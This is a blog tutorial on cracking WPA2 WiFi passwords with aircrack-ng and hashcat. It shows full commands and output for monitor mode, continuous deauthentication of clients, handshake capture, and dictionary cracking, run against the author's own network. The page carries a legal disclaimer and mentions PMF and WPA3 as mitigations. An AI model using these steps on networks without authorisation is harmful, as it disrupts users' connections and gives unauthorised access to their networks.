---
layout: post
title: "Understanding WiFi Security: A Guide to Aircrack-ng"
description: "A comprehensive guide to WiFi security testing using Aircrack-ng suite. Learn about WPA2 vulnerabilities, deauthentication attacks, and password cracking techniques."
date: 2025-02-20 22:38:22 -0700
categories: [aircrack, hacking]
tags: [wifi-security, aircrack-ng, wpa2, network-security, pentesting]
image: /assets/images/aircracklogo.png
image_alt: "Aircrack-ng Logo - WiFi Security Testing Suite"
author: Drew Alleman
last_modified_at: 2025-02-20 22:38:22 -0700
disclaimer: "This guide is for educational purposes only. Only test networks you own or have explicit permission to test."
---
## Introduction
**Legal Disclaimer:**  This guide is provided for educational purposes only. All techniques, tools, and information described herein are intended solely for use in authorized testing and research on networks for which you have explicit permission to test. Unauthorized use of these techniques on networks or systems without proper authorization is illegal and may result in civil and criminal penalties. The author assumes no responsibility or liability for any misuse or damages arising from the use of the information provided. Always obtain written consent from the network owner before performing any security testing.
### What Criteria Needs to Be Met?
- The WiFi network must be using a weak or guessable password.
- A WiFi adapter that supports [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode) is required.
- At least one client must be connected to the WiFi network.

**Additional Notes:**

- Wi-Fi networks with **Protected Management Frames (PMF)** enabled are resistant to deauthentication attacks, preventing automatic reauthentication of clients.


- WPA3 introduces a more secure handshake (the SAE handshake) that provides forward secrecy and mitigates offline dictionary attacks.

### How Does the Attack Work?
WPA2 networks are vulnerable to deauthentication attacks, where an attacker sends spoofed deauthentication frames to force clients to disconnect. When these clients reconnect, a four-way handshake is captured. This handshake can then be used in offline attacks to attempt to crack the WiFi password, especially if a weak passphrase is used.
### Installing The Aircrack Suite
[aircrack-ng](https://www.aircrack-ng.org/) is a suite of networking security tools:

- **airodump-ng**: Packet capture and export of data to text files for further processing by third party tools

- **airoplay-ng**: Replay attacks, deauthentication, fake access points and others via packet injection

- **aircrack-ng**: WEP and WPA PSK (WPA 1 and 2)

- **airmon-ng**: Checking WiFi cards and driver capabilities (capture and injection)

To Install it you can run the following command:
```bash
drew@kali:~$ sudo apt install aircrack-ng
[sudo] password for drew:
Sorry, try again.
[sudo] password for drew:
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
aircrack-ng is already the newest version (1:1.6+git20210130.91820bc-2).
0 upgraded, 0 newly installed, 0 to remove and 52 not upgraded.
```

### Setting up Our WiFi Adapter in Monitor Mode (Needed)
We now need to find our WiFi adapter that supports monitor mode. Monitor mode allows packets to be captured without having to associate with an access point. You can use the `iwconfig` command to list the available interfaces. Look for the adapter that references `IEEE 802.11`. In my case, my adapter was `wlan0`.

```
drew@kali:~$ iwconfig

eth0      no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=3 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

To enable monitor mode, use the following `airmon-ng` command:
```
drew@kali:~$ sudo airmon-ng start wlan0 

Found 1 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
   1707 dhclient

PHY     Interface       Driver          Chipset

phy0    wlan0           mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

After that, run `iwconfig` and locate your new WiFi interface with monitor mode enabled. In my case, this was `wlan0mon`.
```
drew@kali:~$ iwconfig                  

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```
## Capturing the Handshake
In this tutorial, I will be hacking **my own** network called AP, which is configured with a weak password.
### Fetching Needed Attack Information
Use `airodump-ng` followed by your Wi-Fi adapter in monitor mode.

```
drew@kali:~$ sudo airodump-ng wlan0mon
```

You will now see an output of all nearby WiFi networks. I have highlighted some of the important attributes it displays:

- **BSSID:** The mac address of the access point hosting the WiFi Network

- **PWR:** How strong is the connection is

- **Beacons:**  The amount of management packets broadcasted by the AP

- **CH:** The channel the WiFi router is broadcasting on

- **ENC CIPHER:** The encryption level 

- **AUTH:** authentication method used by the network (e.g: PSK = shared password)

- **ESSID:** The WiFi networks name 

```
 CH  4 ][ Elapsed: 6 s ][ 2025-02-17 22:27                                                                                                                                                   
                                                                                                                                                                                             
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                             
                                                                                                                                                                                             
 DC:EF:09:E5:6D:9C  -26        5        1    0   4  720   WPA2 CCMP   PSK  NETGEAR-1AP                                                                                                       
 1A:36:2A:2E:D0:E0  -56        4        0    0   1  360   WPA2 CCMP   PSK  AP                                                                                                                
 F8:79:0A:D5:24:3C  -75        1        8    0   1  260   WPA2 CCMP   PSK  AmishRebel                                                                                                        
 DC:EB:69:9A:4B:43  -76        2        2    0   1  130   WPA2 CCMP   PSK  FlyWIFI                                                                                                           
 DC:EB:69:9A:4B:46  -77        2        0    0   1  130   WPA2 CCMP   PSK  <length:  0>                                                                                                      
 DC:EB:69:9A:4B:49  -77        2        0    0   1  130   WPA2 CCMP   PSK  <length:  0>                                                                                                      
                                                                                                                                                                                             
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                           
                                                                                                                                                                                             
 (not associated)   84:D8:1B:5A:CB:55  -78    0 - 1      0        1         Hardy                                                                                                            
 (not associated)   44:61:32:1F:83:CD  -79    0 - 1      1        5                                                                                                                          
 (not associated)   7C:87:CE:E1:DD:BC  -76    0 - 1      0        1         Fartboxhot                                                                                                       
 F8:79:0A:D5:24:3C  EE:D4:09:15:FE:54   -1   12e- 0      0        8                     
```

This output provides all the necessary information for the next two parts of the attack: the `BSSID` and `CH`.
```
 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID       
 1A:36:2A:2E:D0:E0  -56        4        0    0   1  360   WPA2 CCMP   PSK  AP      
```

### Capturing Target WiFi Network Traffic
Now, let's start a new `airodump-ng` session, capturing only traffic from the specified access point.

```
drew@kali:~$ sudo airodump-ng wlan0mon --bssid 1A:36:2A:2E:D0:E0 --channel 1 -w netcap 
```

### Deauthenticating WiFi Clients
Open a new terminal window and run the following command to continuously send deauthentication frames to all clients on the target network. The `--deauth 0` argument instructs the tool to send deauth frames indefinitely until you stop the process with CTRL+C, while the `-a` option specifies the router's BSSID.

```
drew@kali:~$ sudo aireplay-ng --deauth 0 -a 1A:36:2A:2E:D0:E0 wlan0mon                        
22:37:44  Waiting for beacon frame (BSSID: 1A:36:2A:2E:D0:E0) on channel 1
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
22:37:44  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:45  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:45  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:46  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:46  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:47  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
22:37:47  Sending DeAuth (code 7) to broadcast -- BSSID: [1A:36:2A:2E:D0:E0]
```

#### Confirming the Handshake was Captured
Return to your `airodump-ng` session and monitor for the WPA handshake message. Once the handshake is captured, you can safely terminate both the `airodump-ng` and `aireplay-ng` sessions by pressing CTRL+C.

```
 CH  1 ][ Elapsed: 1 min ][ 2025-02-17 22:38 ]**[ WPA handshake: 1A:36:2A:2E:D0:E0]**                                                                                                             
                                                                                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                                                         
                                                                                                                                                                                             
 1A:36:2A:2E:D0:E0  -63 100      389       10    0   1  360   WPA2 CCMP   PSK  AP                                                                                                            
                                                                                                                                                                                             
 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes                                                                                                           
                                                                                                                                                                                             
 1A:36:2A:2E:D0:E0  E8:B0:C5:31:E7:E7  -48    1e- 6e     0       22  EAPOL           
```

## Cracking The Captured Password
The captured handshake in the `netcap-01.cap` file.

```
drew@kali:~$ ls
netcap-01.cap  netcap-01.csv  netcap-01.kismet.csv  netcap-01.kismet.netxml  netcap-01.log.csv
```
### Using Aircrack-ng
We can use the `aircrack-ng` tool to perform a dictionary attack on the captured handshake to crack the WiFi password. In this example, we'll use a dictionary from [Seclists](https://github.com/danielmiessler/SecLists). Run the following command, where:

- `-w` specifies the path to the dictionary file.
- `netcap-01.cap` is the capture file containing the handshake.

If the password is weak and included in your dictionary, `aircrack-ng` will find it and display the key along with additional handshake details. In my case, the WiFi password was `password`. 
```
drew@kali:~$ aircrack-ng -w  /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt netcap-01.cap
                               Aircrack-ng 1.6 

      [00:00:00] 2372/4800 keys tested (7414.84 k/s) 

      Time left: 0 seconds                                      49.42%

                           KEY FOUND! [ password ]

      Master Key     : D1 EE C8 ED B4 43 1E 8A 89 C2 66 D6 51 5F 87 E7 
                       6F CD A8 86 8E 2D 73 34 A9 FA B1 5A E4 09 0D EF 

      Transient Key  : AA 36 5F 32 3D 44 F9 ED 6F 4B 22 A0 23 CA 36 66 
                       9D BC 7C 96 36 89 A3 39 B2 50 EE 88 98 20 65 A4 
                       B9 1B 7F 3E AF 76 59 89 24 C9 1A 12 82 2E 9C D2 
                       D3 68 CD 7E 66 0D 97 8E 41 61 95 23 08 D9 00 4A 

      EAPOL HMAC     : 6B 1E 98 DF A1 10 71 B4 BA 12 59 4B 67 19 76 2B 
```

### Using Hashcat (GPU)
If you want to leverage your GPU for increased speed you can use [hashcat](https://hashcat.net/hashcat/).

#### Installing Hashcat and Hcxtools
We need `hxctools` to extract the hash from the capture file automatically. 
```
drew@kali:~$ sudo apt install hashcat hcxtools
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
hashcat is already the newest version (6.2.6+ds2-1).
hcxtools is already the newest version (6.3.4-1).
0 upgraded, 0 newly installed, 0 to remove and 1291 not upgraded.
```
#### Extracting the Hash From The Capture File
You can use the `hcxpcapngtool` from the `hcxtools` suite with the following options:
- `-o ap.hc22000` output file to store the hash compatible with `hashcat
- `netcap-01.cap` the network capture with the handshake

```
drew@kali:~$ hcxpcapngtool -o ap.hc22000 netcap-01.cap
```

We can use `ls` to list the newly created file. 
```
drew@kali:~$ls                                                                                                                                                                                 130 ⨯
ap.hc22000  netcap-01.cap  netcap-01.csv  netcap-01.kismet.csv  netcap-01.kismet.netxml  netcap-01.log.csv
```
#### Running Hashcat
We can now run hashcat with the following options to crack the password:

- **-m 22000**: This option sets the hash mode to `22000`, which corresponds to WPA-PBKDF2-PMKID+EAPOL. It tells hashcat what type of hash it is working on.

- **ap.hc22000**: This file contains the captured WPA handshake data in a format (`.hc22000`) that hashcat can process.

- **/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt**: This is the path to the dictionary file that hashcat will use. The tool will try each password in this list to see if it matches the hash in `ap.hc22000`.

```
drew@kali:~$ hashcat -m 22000 ap.hc22000 /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
hashcat (v6.2.6) starting

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
* Passwords.: 4800
* Bytes.....: 45276
* Keyspace..: 4800
* Runtime...: 0 secs

c329a97d3d1ba2ea83384427de1b3ca6:1a362a2ed0e0:e8b0c531e7e7:AP:password
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: ap.hc22000
Time.Started.....: Mon Feb 17 23:46:50 2025 (1 sec)
Time.Estimated...: Mon Feb 17 23:46:51 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1964 H/s (10.90ms) @ Accel:128 Loops:256 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/4800 (21.33%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/4800 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: password -> christin

Started: Mon Feb 17 23:46:03 2025
Stopped: Mon Feb 17 23:46:52 2025
```
